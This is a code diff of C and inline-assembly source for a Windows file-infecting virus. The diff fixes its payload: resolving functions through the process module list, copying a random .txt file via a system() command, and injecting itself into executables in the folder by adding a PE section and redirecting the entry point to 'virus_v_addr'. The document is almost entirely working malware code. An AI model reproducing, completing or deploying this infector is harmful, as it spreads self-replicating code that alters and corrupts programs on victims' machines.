@@ -47,11 +47,23 @@ int match_suffix(char *str, char* suffix) SET_SECT;
 int main()
 {
     payload();
+    // asm ("payload_ret:");
+    // DWORD ret_addr = 0;
+    // asm volatile(
+    //     // "leal main, %%eax\n\t"
+    //     "leal payload_ret, %%ebx\n\t"
+    //     // "subl %%eax, %%ebx\n\t"
+    //     "movl %%ebx, %0\n\t"
+    //     :"=r" (ret_addr)
+    //     :
+    //     :"eax", "ebx"
+    // ); // 0x1018 0x401568 0x001568
+    // printf("%X\n", ret_addr);
     return 0;
 }
 
 void payload(void)
-{    
+{
     // get_InMemoryOrderModuleList
     LIST_ENTRY *list = 0;
     {
@@ -155,9 +167,9 @@ const char empty_str[] = "";
     asm volatile (
         // "xor %%rax, %%rax\n\t"
         "key_label: \n\t"
-        "mov $0x000957C8, %%rax\n\t"
+        "mov $0x00001568, %%rax\n\t" // ret
+        // "mov $0x000957C8, %%rax\n\t" // PE-bear
         // "mov $0x000014E0, %%rax\n\t"
-        // "mov $0x1234ABCD, %%rax\n\t"
         "add %[base_addr], %%rax\n\t"
         "jmp *%%rax"
         :
@@ -189,17 +201,19 @@ const char empty_str[] = "";
         HANDLE hFind = K32_FUNCTION(FindFirstFileA)(param, &findFileData);
 
         char suffix[] = ".txt";
-        char txt_file_name[MAX_PATH];
+        char txt_file_name[MAX_PATH] = {0};
         FUNCTION(srand)(FUNCTION(time)(NULL));
         do 
         {
             if (match_suffix(findFileData.cFileName, suffix))
             {
-                FUNCTION(memcpy)(txt_file_name, findFileData.cFileName, length(findFileData.cFileName));
+                int len = length(findFileData.cFileName);
+                FUNCTION(memcpy)(txt_file_name, findFileData.cFileName, len);
+                txt_file_name[len] = '\0';
                 if(FUNCTION(rand)()%2)
                 {
                     break;
-                } 
+                }
             }
         } while (K32_FUNCTION(FindNextFileA)(hFind, &findFileData) != 0);
         K32_FUNCTION(FindClose)(hFind);
@@ -213,11 +227,12 @@ const char empty_str[] = "";
         FUNCTION(sprintf)(cpy_cmd, cpy_fomat, txt_file_name, dest_path);
         FUNCTION(system)(cpy_cmd);
 
+
         RET(task1);
     } // end of task1
 
     // ===========================================
-    char *target = NULL; 
+    char target[MAX_PATH] = {0};
     payload_info_t payload_info = {0}; // parameters for inject
     infect: {
         asm ("nop");
@@ -225,7 +240,7 @@ const char empty_str[] = "";
         CALL(get_payload);
         get_payload_ret: asm("nop");
 
-        WIN32_FIND_DATA findFileData;
+        WIN32_FIND_DATAA findFileData;
         char param[] = "*.*"; 
         HANDLE hFind = K32_FUNCTION(FindFirstFileA)(param, &findFileData);
 
@@ -234,7 +249,9 @@ const char empty_str[] = "";
         {
             if (match_suffix(findFileData.cFileName, suffix))
             {
-                target = findFileData.cFileName;
+                int len = length(findFileData.cFileName);
+                FUNCTION(memcpy)(target, findFileData.cFileName, len);
+                target[len] = '\0';
                 CALL(inject);
                 inject_ret: asm("nop");
             }
@@ -247,11 +264,15 @@ const char empty_str[] = "";
     inject:{
         asm ("nop");
 
+        char msg[] = "Skipping: ";
+
         char mode[] = "rb+";
         FILE *host = FUNCTION(fopen)(target, mode);
 
         if(host == NULL) {
             FUNCTION(fclose)(host);
+            // FUNCTION(puts)(msg);
+            // FUNCTION(puts)(target);
             RET(inject);
         }
 
@@ -286,6 +307,7 @@ const char empty_str[] = "";
 
         if(!infectable) {
             FUNCTION(fclose)(host);
+            // FUNCTION(puts)(msg);
             RET(inject);
         }
 
@@ -324,7 +346,12 @@ const char empty_str[] = "";
         DWORD AddressOfEntryPoint = i_nt_headers.OptionalHeader.AddressOfEntryPoint;
         i_nt_headers.OptionalHeader.AddressOfEntryPoint = virus_v_addr;
         i_nt_headers.FileHeader.NumberOfSections++;
-        i_nt_headers.OptionalHeader.SizeOfHeaders += sizeof(IMAGE_SECTION_HEADER);
+        // !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+        // del: i_nt_headers.OptionalHeader.SizeOfHeaders += sizeof(IMAGE_SECTION_HEADER);
+        // add: 
+        i_nt_headers.OptionalHeader.BaseOfCode = virus_v_addr;
+        // !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
         // i_nt_headers.OptionalHeader.SizeOfCode += sizeof(IMAGE_SECTION_HEADER);
         i_nt_headers.OptionalHeader.SizeOfImage += payload_info.size
             + i_nt_headers.OptionalHeader.SectionAlignment 
